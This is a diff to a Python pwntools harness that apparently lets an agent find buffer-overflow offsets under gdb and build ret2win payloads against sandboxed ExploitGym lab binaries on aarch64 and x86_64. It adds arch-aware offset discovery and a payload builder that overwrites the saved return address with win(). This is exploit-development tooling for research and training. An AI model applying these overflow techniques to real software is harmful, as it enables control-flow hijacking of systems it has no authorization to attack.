@@ -24,14 +24,18 @@ os.environ.setdefault("PWNLIB_SILENT", "1")
 from pwn import (
     context, process, ELF, cyclic, cyclic_find, ROP,
 )
-# The spike substrate is ARM64 (Apple Silicon, native — no emulation). The
-# ret2win ladder is demonstrated on aarch64: the return address is the saved link
-# register (x30) on the stack; overwriting it and letting vuln() return (ret ->
-# br x30) redirects control to win(). x86 via --platform emulation is a future option.
-context.arch = "aarch64"
+# Arch is derived from the TARGET binary, not hardcoded: the harness runs on both
+# aarch64 (Apple Silicon substrate) and x86_64 (the Linux substrate / real ExploitGym
+# targets). On aarch64 the return address is the saved link register (x30); on x86_64
+# it is the saved value at [rsp]. The offset/register logic below branches on this.
 context.log_level = "error"
 
 BIN = os.environ.get("TARGET_BIN", "/work/ret2win")
+try:
+    context.binary = ELF(BIN, checksec=False)   # sets context.arch / bits / os from the target
+except Exception:
+    context.arch = "aarch64"                     # fall back to the native substrate arch
+ARCH = context.arch                              # "aarch64" | "amd64"
 S = {"io": None, "gdb": None}
 SENT = "<<GDBQ>>"   # unique gdb prompt sentinel; keeps gdb output framed and OFF the protocol stdout
 
@@ -123,32 +127,53 @@ def op_debug_cmd(a):
     return {"output": _gdb_cmd(a["cmd"], a.get("timeout", 15))}
 
 def op_debug_regs(a):
+    if ARCH == "amd64":
+        # x86_64: rip (control), rsp, rbp, rdi/rsi (first args)
+        return {"registers": _gdb_cmd("info registers rip rsp rbp rdi rsi")}
     # aarch64: pc (control), sp, x30 (link register / saved return), x0/x1 (args)
     return {"registers": _gdb_cmd("info registers pc sp x29 x30 x0 x1")}
 
 def op_crash_offset(a):
-    # Debugger-driven offset discovery: run a cyclic pattern under gdb, let the
-    # function return into it, read the faulting pc, and map it back to an offset.
-    # This is the persistent-debugger IAT doing real exploit-dev work.
+    # Debugger-driven offset discovery, arch-robust. Run a cyclic pattern under gdb,
+    # let vuln() return into it, and map the cyclic subsequence that landed in the
+    # return slot back to an offset. This is the persistent-debugger IAT doing real
+    # exploit-dev work.
+    #   aarch64: the saved LR is loaded into $pc, so the pattern lands in $pc.
+    #   x86_64:  an ASCII cyclic pattern is a NON-CANONICAL address, so `ret` raises
+    #            #GP and the pattern stays on the stack (at/near $sp), NOT in $pc.
+    # So we read $pc AND scan the top of the stack. $pc/$sp are gdb convenience vars
+    # that resolve on both arches (unlike the arch-specific rip/pc register names).
+    import re as _re
     n = int(a.get("length", 200))
     patt = cyclic(n)
     with open("/tmp/gdb_input", "wb") as f:
         f.write(patt)
     _gdb_cmd("delete")                  # clear breakpoints so run goes straight to the crash
     _gdb_cmd("run < /tmp/gdb_input")    # runs to the fault (return into the pattern)
-    pcline = _gdb_cmd("info registers pc")
-    import re as _re
-    m = _re.search(r"pc\s+0x([0-9a-f]+)", pcline)
-    if not m:
-        return {"error": "no pc after run", "raw": pcline}
-    pc = int(m.group(1), 16)
-    # the low bytes of pc are the cyclic subsequence that landed in the return slot
-    val = (pc & 0xffffffffffffffff).to_bytes(8, "little").rstrip(b"\x00")[:4]
-    try:
-        off = cyclic_find(val)
-    except Exception as e:
-        off = -1
-    return {"pc": hex(pc), "offset": off}
+
+    def _word(expr):
+        out = _gdb_cmd(f'printf "%#018lx\\n", (unsigned long)({expr})')
+        m = _re.search(r"0x([0-9a-f]+)", out)
+        return int(m.group(1), 16) if m else None
+
+    # Candidate holders of the return-slot subsequence, in priority order.
+    exprs = ["$pc", "*(unsigned long*)$sp", "*(unsigned long*)($sp-8)", "*(unsigned long*)($sp-16)"]
+    tried = {}
+    for e in exprs:
+        v = _word(e)
+        if v is None:
+            continue
+        tried[e] = hex(v)
+        b = v.to_bytes(8, "little").rstrip(b"\x00")[:4]   # low bytes = the cyclic subsequence
+        if len(b) < 4:
+            continue
+        try:
+            off = cyclic_find(b)
+        except Exception:
+            off = -1
+        if off is not None and off >= 0:
+            return {"offset": off, "via": e, "value": hex(v), "arch": ARCH}
+    return {"error": "offset not found in pc/stack", "arch": ARCH, "candidates": tried}
 
 def op_debug_run_input(a):
     # Write bytes to a file inside the sandbox and `run < file` under gdb, so a
@@ -274,6 +299,30 @@ def op_exploit(a):
         results.append({"exit": rc, "marker_fired": fired, "marker_content": content})
     return {"times": times, "fires": fires, "reliability": fires / times if times else 0, "results": results}
 
+
+def op_ret2win_payload(a):
+    # Arch-aware ret2win payload builder: <offset> filler + saved-return overwrite
+    # with win(). x86_64 (SysV ABI) requires 16-byte stack alignment at a `call`, so
+    # entering win() directly misaligns the stack and faults in its printf; prepend a
+    # bare `ret` gadget to realign. aarch64 needs no realign (matches prior behavior).
+    off = int(a["offset"])
+    win_name = a.get("win_symbol") or "win"
+    e = ELF(BIN, checksec=False)
+    if win_name not in e.symbols:
+        return {"error": f"no symbol {win_name}"}
+    win = e.symbols[win_name]
+    realign, chain = None, b""
+    if context.arch == "amd64":
+        try:
+            g = ROP(e).find_gadget(["ret"])
+            if g is not None:
+                realign = g.address
+                chain = realign.to_bytes(8, "little")
+        except Exception:
+            pass
+    payload = b"A" * off + chain + win.to_bytes(8, "little")
+    return {"payload_hex": payload.hex(), "win": hex(win), "arch": context.arch,
+            "realign": hex(realign) if realign is not None else None}
 
 def _read_leak(io):
     # Parse a "leak: 0x....\n" line from the target and return the address int.
